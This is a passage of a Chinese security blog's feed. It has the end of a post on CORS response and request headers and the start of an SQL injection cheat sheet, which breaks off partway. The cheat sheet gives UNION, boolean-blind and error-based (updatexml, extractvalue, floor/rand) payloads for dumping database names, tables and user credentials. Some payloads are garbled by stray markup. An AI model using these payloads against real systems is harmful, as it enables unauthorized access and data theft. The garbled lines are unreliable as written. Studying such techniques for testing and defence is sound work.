<code>Access-Control-Allow-Origin</code> 的值为“<code>*</code>”。</p><p>这是因为请求的首部中携带了 <code>Cookie</code> 信息，如果 <code>Access-Control-Allow-Origin</code> 的值为“<code>*</code>”，请求将会失败。而将 <code>Access-Control-Allow-Origin</code> 的值设置为 <code>http://foo.example</code>，则请求将成功执行。</p><p>另外，响应首部中也携带了 Set-Cookie 字段，尝试对 Cookie 进行修改。如果操作失败，将会抛出异常。</p><h3 id="第三方cookies"><a href="#第三方cookies" class="headerlink" title="第三方cookies"></a>第三方cookies</h3><p>注意在CORS响应中设置的cookies使用一般性第三方cookie策略。在上面的例子中，页面是在‘foo。example’加载，但是第20行的cookie是被‘bar.other’发送的，如果用户设置其浏览器拒绝所有第三方cookies，那么将不会被保存。</p><h2 id="HTTP响应首部字段"><a href="#HTTP响应首部字段" class="headerlink" title="HTTP响应首部字段"></a>HTTP响应首部字段</h2><h3 id="Access-Control-Allow-Origin"><a href="#Access-Control-Allow-Origin" class="headerlink" title="Access-Control-Allow-Origin"></a>Access-Control-Allow-Origin</h3><p>响应首部中可以携带一个Access-Control-Allow-Origin 字段，其语法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: &lt;origin&gt; | *</span><br></pre></td></tr></table></figure><p>其中，origin参数的值指定了允许访问该资源的外域URI。对于不需要携带身份凭证的请求，服务器可以指定该字段的值为通配符，表示允许来自所有域的请求。</p><p>例如，下面的字段值将允许来自<a href="http://mozilla.com/">http://mozilla.com</a> 的请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;mozilla.com</span><br></pre></td></tr></table></figure><p>如果服务端指定了具体的域名而非“*”，那么响应首部中的Vary字段的值必须包含Origin。这将告诉客户端：服务器对不同的源站返回不同的内容。</p><h3 id="Access-Control-Expose-Headers"><a href="#Access-Control-Expose-Headers" class="headerlink" title="Access-Control-Expose-Headers"></a><strong>Access-Control-Expose-Headers</strong></h3><p>在跨源访问时，XMLHttpRequest对象的getResponseHeader()方法只能拿到一些最基本的响应头，Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma，如果要访问其他头，则需要服务器设置本响应头。</p><p><code>[Access-Control-Expose-Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Expose-Headers)</code> 头让服务器把允许浏览器访问的头放入白名单，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样浏览器就能够通过getResponseHeader访问<code>X-My-Custom-Header</code>和 <code>X-Another-Custom-Header</code> 响应头了。</p><h3 id="Access-Control-Max-Age"><a href="#Access-Control-Max-Age" class="headerlink" title="Access-Control-Max-Age"></a>Access-Control-Max-Age</h3><p><code>[Access-Control-Max-Age](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Max-Age)</code> 头指定了preflight请求的结果能够被缓存多久，请参考本文在前面提到的preflight例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Max-Age: &lt;delta-seconds&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>delta-seconds</code> 参数表示preflight请求的结果在多少秒内有效。</p><h3 id="Access-Control-Allow-Credentials"><a href="#Access-Control-Allow-Credentials" class="headerlink" title="Access-Control-Allow-Credentials"></a>Access-Control-Allow-Credentials</h3><p><code>[Access-Control-Allow-Credentials](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials)</code> 头指定了当浏览器的<code>credentials</code>设置为true时是否允许浏览器读取response的内容。当用在对preflight预检测请求的响应中时，它指定了实际的请求是否可以使用<code>credentials</code>。请注意：简单 GET 请求不会被预检；如果对此类请求的响应中不包含该字段，这个响应将被忽略掉，并且浏览器也不会将相应内容返回给网页。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上文已经讨论了<a href="https://developer.mozilla.org/zh-CN/docs/web/http/CORS#requests_with_credentials">附带身份凭证的请求</a>。</p><h3 id="Access-Control-Allow-Methods"><a href="#Access-Control-Allow-Methods" class="headerlink" title="Access-Control-Allow-Methods"></a>Access-Control-Allow-Methods</h3><p><code>[Access-Control-Allow-Methods](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Methods)</code> 首部字段用于预检请求的响应。其指明了实际请求所允许使用的 HTTP 方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相关示例见<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS$edit#Preflighted_requests">这里</a>。</p><h3 id="Access-Control-Allow-Headers"><a href="#Access-Control-Allow-Headers" class="headerlink" title="Access-Control-Allow-Headers"></a>Access-Control-Allow-Headers</h3><p><code>[Access-Control-Allow-Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Headers)</code> 首部字段用于预检请求的响应。其指明了实际请求中允许携带的首部字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</span><br></pre></td></tr></table></figure><h2 id="HTTP请求首部字段"><a href="#HTTP请求首部字段" class="headerlink" title="HTTP请求首部字段"></a>HTTP请求首部字段</h2><p>这些首部字段无须手动设置，当使用XMLHttpRequest对象发起跨源请求时，它们已经被设置就绪。</p><h3 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h3><p>Origin首部字段表明预检请求或实际请求的源站。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin:&lt;origin&gt;</span><br></pre></td></tr></table></figure><p>origin的参数值为源站的URI，它不用包含任意路径信息，它只是服务器名称。</p><p><strong>注意：</strong>有时候将该字段的值设置为空字符是一样有用可以生效的，例如当源站是一个data URL时</p><p><strong>注意：</strong>在所有访问控制请求中，Origin首部字段总是被发送。</p><h3 id="Access-Control-Request-Method"><a href="#Access-Control-Request-Method" class="headerlink" title="Access-Control-Request-Method"></a>Access-Control-Request-Method</h3><p><code>[Access-Control-Request-Method](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Method)</code> 首部字段用于预检请求。其作用是，将实际请求所使用的 HTTP 方法告诉服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Request-Method: &lt;method&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相关示例见<a href="https://developer.mozilla.org/zh-CN/docs/web/http/CORS#preflighted_requests">这里</a>。</p><h3 id="Access-Control-Request-Headers"><a href="#Access-Control-Request-Headers" class="headerlink" title="Access-Control-Request-Headers"></a>Access-Control-Request-Headers</h3><p><code>[Access-Control-Request-Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Headers)</code> 首部字段用于预检请求。其作用是，将实际请求所携带的首部字段告诉服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;同源策略和CORS&quot;&gt;&lt;a href=&quot;#同源策略和CORS&quot; class=&quot;headerlink&quot; title=&quot;同源策略和CORS&quot;&gt;&lt;/a&gt;同源策略和CORS&lt;/h1&gt;&lt;h1 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="基础学习" scheme="http://fxizenta.github.io/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web安全" scheme="http://fxizenta.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>sql注入总结(补充更新中)</title>
    <link href="http://fxizenta.github.io/2021/04/17/sqli/"/>
    <id>http://fxizenta.github.io/2021/04/17/sqli/</id>
    <published>2021-04-17T08:52:02.000Z</published>
    <updated>2021-04-17T09:02:57.873Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h1><h1 id="0x00注入原理"><a href="#0x00注入原理" class="headerlink" title="0x00注入原理"></a>0x00注入原理</h1><p>SQL注入主要通过闭合字符串，注释后续本来为命令的一部分字符改变为文本的方式来对sql语句进行拼接达到执行任意sql命令的目的</p><p>SQL注入式攻击的主要形式有两种。一是直接将代码插入到与SQL命令串联在一起并使得其以执行的用户输入变量。二是一种间接的攻击方法，它将恶意代码注入要在表中存储或者作为原书据存储的字符串。在再次查询时，存储的字符串会连接到一个SQL命令中，执行一些注入者想要的恶意的QL代码(这种注入方式一般被称为二次注入)。</p><h1 id="0x01注入类型的判断"><a href="#0x01注入类型的判断" class="headerlink" title="0x01注入类型的判断"></a>0x01注入类型的判断</h1><h2 id="按变量类型分类"><a href="#按变量类型分类" class="headerlink" title="按变量类型分类"></a>按变量类型分类</h2><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>可以进行?id=3-1进行测试，如果回显结果是?id=2的回显的话，那说明注入点为数字型</p><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>可以进行?id=2a进行测试，如果回显结果是?id=2的回显的话，那说明注入点为字符型</p><h1 id="0x02判断后台数据库种类"><a href="#0x02判断后台数据库种类" class="headerlink" title="0x02判断后台数据库种类"></a>0x02判断后台数据库种类</h1><p>其中mysql最为常见</p><h3 id="根据操作系统平台"><a href="#根据操作系统平台" class="headerlink" title="根据操作系统平台"></a><strong>根据操作系统平台</strong></h3><p><strong>sql server</strong>：Windows（IIS)</p><p><strong>MySQL</strong>：Apache</p><h3 id="根据web语言"><a href="#根据web语言" class="headerlink" title="根据web语言"></a><strong>根据web语言</strong></h3><p><strong>Microsoft SQL Server</strong>：ASP和.Net</p><p><strong>MySQL</strong>：PHP</p><p><strong>Oracle/MySQL</strong>：java</p><p>以下以mysql数据库为主</p><h1 id="0x03手工注入"><a href="#0x03手工注入" class="headerlink" title="0x03手工注入"></a>0x03手工注入</h1><p>MySQL版本大于5.0和小于5.0的注入流程区别比较大，下午主要以大于5.0版本为主</p><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p>信息数据库</p><p><strong>information_schema（after mysql 5.0)</strong></p><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p><p><strong>SCHEMATA</strong></p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</p><p><strong>TABLES</strong></p><p>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p><p><strong>COLUMNS</strong></p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><p><strong>length(str)</strong> ：返回字符串str的长度</p><p><strong>substr(str, pos, len)</strong> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p><p><strong>mid(str,pos,len)</strong> ：跟上面的一样，截取字符串</p><p><strong>ascii(str)</strong> ：返回字符串str的最左面字符的ASCII代码值</p><p><strong>ord(str)</strong> ：将字符或布尔类型转成ascll码</p><p><strong>if(a,b,c)</strong> ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p><h2 id="基本流程思路"><a href="#基本流程思路" class="headerlink" title="基本流程思路"></a>基本流程思路</h2><h3 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数字型：id<span class="operator">=</span><span class="number">2</span><span class="number">-1</span></span><br><span class="line">字符型：<span class="string">&#x27; 、&#x27;</span>)、 <span class="string">&#x27;))、 &quot;、 &quot;)、 &quot;))</span></span><br><span class="line"><span class="string">注释符：-- （这是--空格）、--+、/**/、#</span></span><br></pre></td></tr></table></figure><h3 id="2-获取字段数和观察页面回显的字段处"><a href="#2-获取字段数和观察页面回显的字段处" class="headerlink" title="2.获取字段数和观察页面回显的字段处"></a>2.获取字段数和观察页面回显的字段处</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n</span><br></pre></td></tr></table></figure><h3 id="3-获取数据库名"><a href="#3-获取数据库名" class="headerlink" title="3.获取数据库名"></a>3.获取数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,database() </span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> group_concat(schema_name)<span class="keyword">from</span> information schema.schemata),</span><br></pre></td></tr></table></figure><h3 id="4-获取表名"><a href="#4-获取表名" class="headerlink" title="4.获取表名"></a>4.获取表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables),<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="5-获取表中的字段"><a href="#5-获取表中的字段" class="headerlink" title="5.获取表中的字段"></a>5.获取表中的字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;xxxxxxxx&#x27;</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns),<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="6-获取各个字段的具体值"><a href="#6-获取各个字段的具体值" class="headerlink" title="6.获取各个字段的具体值"></a>6.获取各个字段的具体值</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,group_concat(username,password) <span class="keyword">from</span> xxxxxxx</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span>(<span class="keyword">select</span> group_concat(id,<span class="string">&#x27;~&#x27;</span>,uname)<span class="keyword">from</span> test.users),<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="常见的注入方法"><a href="#常见的注入方法" class="headerlink" title="常见的注入方法"></a>常见的注入方法</h2><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>主要用于注释后续代码为注释文本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># <span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="comment">--(空格)或--+</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/*!...*/</span></span><br></pre></td></tr></table></figure><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p><strong>user() ：</strong>当前使用者的用户名</p><p><strong>database()：</strong>当前数据库名</p><p><strong>version()：</strong>数据库版本</p><p><strong>datadir：</strong>读取数据库的绝对路径**@@vasedir：<strong>mysql安装路径</strong>@@version_compile_os：<strong>操作系统</strong>concat()：<strong>连接一个或者多个字符串</strong>group_concat()：**连接一个组的所有字符串，并以逗号分隔每一条数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">xx<span class="string">&#x27; union select 1,(select database()) #</span></span><br><span class="line"><span class="string">xx&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> database()),<span class="number">2</span> <span class="keyword">or</span> <span class="string">&#x27;　　　　　　//这里如果把查询语句放到2的位置上，因为or的关系会不能显示正常查询的内容</span></span><br></pre></td></tr></table></figure><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>当查询页面会根据查询的成功和失败出现两种不同页面时可以考虑使用bool注入</p><p><strong>常用函数</strong></p><p>1.char() 解ASCII码;</p><p>2.mid()截取字符串;</p><p>举例：mid(‘hello’,1,3)，从第1位开始截取3位，输出位hel</p><p>3.substr()与mid()相同，都为截取字符串;</p><p>4.count()计算查询结果的行数;</p><p>5.concat()查询结果合并但保持原有行数;</p><p>6.group_concat()查询结果合并但都放在一行中;</p><p>7.ascii() 查询ascii码;</p><p>猜数据库长度(利用二分法);</p><ul><li>id=1 and (length(database()))&gt;1</li><li>id=1 and (length(database()))&gt;50</li></ul><p>猜第一个字符，第二个字符，以此类推</p><ul><li>and ascii(mid(database(),1,1))&gt;1</li><li>and ascii(mid(database(),2,1))&gt;1</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; substr(database(),1,1)=&#x27;</span>t<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>查询当前数据库中所有表名;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> tables_schema<span class="operator">=</span>database())<span class="operator">&gt;</span><span class="number">1</span><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> tables_schema<span class="operator">=</span>database())<span class="operator">&gt;</span><span class="number">10</span></span><br></pre></td></tr></table></figure><p>查询第一个表的长度;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> length(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> tables_schema<span class="operator">=</span>database()limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="number">10</span></span><br></pre></td></tr></table></figure><p>查询表的第一个字符;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>查询atelier表里有几个字段;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="built_in">count</span>(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;atelier&#x27;</span> <span class="keyword">and</span> table_schema <span class="operator">=</span> database())<span class="operator">&gt;</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>查询第一个字段长度;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;atelier&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span> database()limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>查询字段第一个字符;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;db83231_asfaa&#x27;</span> <span class="keyword">and</span> TABLE_NAME <span class="operator">=</span><span class="string">&#x27;atelier&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">105</span></span><br></pre></td></tr></table></figure><p>查询字段所有行数;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> db83231_asfaa.atelier)<span class="operator">&gt;</span><span class="number">4</span></span><br></pre></td></tr></table></figure><p>查询字段名的行数（查询emails表，uname字段）;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(uname)<span class="keyword">from</span> security.emails)<span class="operator">&gt;</span><span class="number">7</span> 查询uname的行数</span><br></pre></td></tr></table></figure><p>查询字段内容;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length((<span class="keyword">select</span> username <span class="keyword">from</span> security.users limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">10</span>ascii(mid((<span class="keyword">select</span> username <span class="keyword">from</span> security.user limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>前提是后端有Exception这种异常处理的回显才能使用，不然即使能报错你也看不到回显。</p><h3 id="floor-和rand"><a href="#floor-和rand" class="headerlink" title="floor()和rand()"></a><strong>floor()和rand()</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="keyword">union</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> count<span class="operator">*</span><span class="operator">*</span>(<span class="operator">*</span>),<span class="number">2</span>,<span class="operator">*</span><span class="operator">*</span>concat<span class="operator">*</span><span class="operator">*</span>(<span class="operator">*</span><span class="operator">*</span><span class="string">&#x27;:&#x27;</span><span class="operator">*</span><span class="operator">*</span>,(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span>database()),<span class="operator">*</span><span class="operator">*</span><span class="string">&#x27;:&#x27;</span><span class="operator">*</span><span class="operator">*</span>,<span class="operator">*</span><span class="operator">*</span>floor<span class="operator">*</span><span class="operator">*</span>(<span class="operator">*</span><span class="operator">*</span>rand<span class="operator">*</span><span class="operator">*</span>()<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span><span class="operator">*</span><span class="operator">*</span> a <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span><span class="operator">*</span><span class="operator">*</span> information_schema<span class="operator">*</span><span class="operator">*</span>.tables<span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">group</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">by</span><span class="operator">*</span><span class="operator">*</span> a       <span class="operator">*</span><span class="comment">/*利用错误信息得到当前数据库名*/</span><span class="operator">*</span></span><br></pre></td></tr></table></figure><p><strong>extractvalue()</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">*</span><span class="operator">*</span><span class="operator">=</span><span class="number">1</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">and</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span>(<span class="operator">*</span><span class="operator">*</span>extractvalue<span class="operator">*</span><span class="operator">*</span>(<span class="number">1</span>,<span class="operator">*</span><span class="operator">*</span>concat<span class="operator">*</span><span class="operator">*</span>(<span class="number">0</span><span class="operator">*</span><span class="operator">*</span>x7e<span class="operator">*</span><span class="operator">*</span>,(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="keyword">user</span><span class="operator">*</span><span class="operator">*</span>()),<span class="number">0</span><span class="operator">*</span><span class="operator">*</span>x7e<span class="operator">*</span><span class="operator">*</span>)))<span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a><strong>updatexml()</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">*</span><span class="operator">*</span><span class="operator">=</span><span class="number">1</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">and</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span>(<span class="operator">*</span><span class="operator">*</span>updatexml<span class="operator">*</span><span class="operator">*</span>(<span class="number">1</span>,<span class="operator">*</span><span class="operator">*</span>concat<span class="operator">*</span><span class="operator">*</span>(<span class="number">0</span><span class="operator">*</span><span class="operator">*</span>x7e<span class="operator">*</span><span class="operator">*</span>,(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="keyword">user</span><span class="operator">*</span><span class="operator">*</span>()),<span class="number">0</span><span class="operator">*</span><span class="operator">*</span>x7e<span class="operator">*</span><span class="operator">*</span>),<span class="number">1</span>))<span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure><h3 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a><strong>geometrycollection()</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">*</span><span class="operator">*</span><span class="operator">=</span><span class="number">1</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">and</span><span class="operator">*</span><span class="operator">*</span> geometrycollection<span class="operator">*</span><span class="operator">*</span>((<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="operator">*</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="operator">*</span> <span class="keyword">user</span><span class="operator">*</span><span class="operator">*</span>())<span class="operator">*</span><span class="operator">*</span>a<span class="operator">*</span><span class="operator">*</span>)<span class="operator">*</span><span class="operator">*</span>b<span class="operator">*</span><span class="operator">*</span>))<span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure><h3 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a><strong>multipoint()</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">*</span><span class="operator">*</span><span 